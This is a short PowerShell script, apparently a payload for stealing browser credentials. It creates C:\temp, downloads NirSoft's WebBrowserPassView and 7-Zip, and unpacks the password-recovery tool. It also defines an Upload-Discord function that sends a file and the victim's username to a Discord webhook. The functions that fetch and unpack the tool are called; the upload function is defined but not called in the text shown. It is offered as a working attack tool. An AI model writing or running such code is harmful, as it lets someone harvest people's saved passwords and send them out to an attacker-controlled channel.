# Function to handle the temporary directory
function TempDir {
    # Check if the C:\temp directory exists
    if (Test-Path -Path "C:\temp" -PathType Container) {
        # The folder exists

        # Check if the current directory is C:\temp
        if (-not (Get-Location).Path -eq "C:\temp") {
            # If not, change the directory
            Set-Location -Path "C:\temp"
        }
    } else {
        # The folder does not exist, create it, and change the directory
        New-Item -Path "C:\" -Name "temp" -ItemType Directory
        Set-Location -Path "C:\temp"
    }
}

function Get-Nirsoft {
    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} -Uri https://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
    Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
    Expand-Archive 7z.zip
    .\7z\7za.exe e wbpv.zip
}

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($file))){
        curl.exe -F "file1=@$file" $DiscordUrl
    }
}

#Call TempDir
TempDir

#Call Get-Nirsoft
Get-Nirsoft
